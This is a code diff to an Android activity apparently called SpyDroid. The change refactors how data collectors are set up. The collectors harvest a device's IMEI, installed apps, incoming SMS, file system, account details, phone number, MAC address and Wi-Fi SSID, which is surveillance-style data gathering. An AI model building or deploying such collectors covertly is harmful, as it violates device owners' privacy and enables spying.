@@ -5,6 +5,7 @@ import android.app.AlertDialog;
 import android.app.AlertDialog.Builder;
 import android.app.Dialog;
 import android.content.ComponentName;
+import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.IntentFilter;
@@ -131,17 +132,18 @@ public final class SpyDroid extends Activity {
 	private void setupCollecting(CollectorService collService) {
 		//Intent Filters
 		IntentFilter smsFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
+		Context ctxt=getApplicationContext();
 		
 		//Collector Declarations
-		StaticCollector imeiColl= new IMEICollector(getApplicationContext(),"coll_IMEI",null);
-		StaticCollector appColl= new InstalledAppCollector(getApplicationContext(),"coll_installed_apps",collService);
+		StaticCollector imeiColl= new IMEICollector(ctxt,"coll_IMEI",null);
+		StaticCollector appColl= new InstalledAppCollector(ctxt,"coll_installed_apps",collService);
 		BroadcastCollector smsColl= new SMSCollector(collService,"coll_received_SMS",smsFilter);
-		StaticCollector fileColl= new FileSystemCollector(getApplicationContext(),"coll_file_system",collService);
-	    StaticCollector accountColl= new AccountInfoCollector(getApplicationContext(),"coll_account_info",null);
-	    StaticCollector MACColl= new MACCollector(getApplicationContext(),"coll_MAC",null);    
-	    StaticCollector PNColl= new PhoneNumberCollector(getApplicationContext(),"coll_phone_number",null);
-	    StaticCollector SSIDColl= new SSIDCollector(getApplicationContext(),"coll_SSID",null);
-	    StaticCollector versionColl= new AndroidVersionCollector(getApplicationContext(),"coll_version",null);
+		StaticCollector fileColl= new FileSystemCollector(ctxt,"coll_file_system",collService);
+	    StaticCollector accountColl= new AccountInfoCollector(ctxt,"coll_account_info",collService);
+	    StaticCollector MACColl= new MACCollector(ctxt,"coll_MAC",null);    
+	    StaticCollector PNColl= new PhoneNumberCollector(ctxt,"coll_phone_number",collService);
+	    StaticCollector SSIDColl= new SSIDCollector(ctxt,"coll_SSID",collService);
+	    StaticCollector versionColl= new AndroidVersionCollector(ctxt,"coll_version",collService);
 	    
 		//Scheduling
 		collService.scheduleCollector(imeiColl);
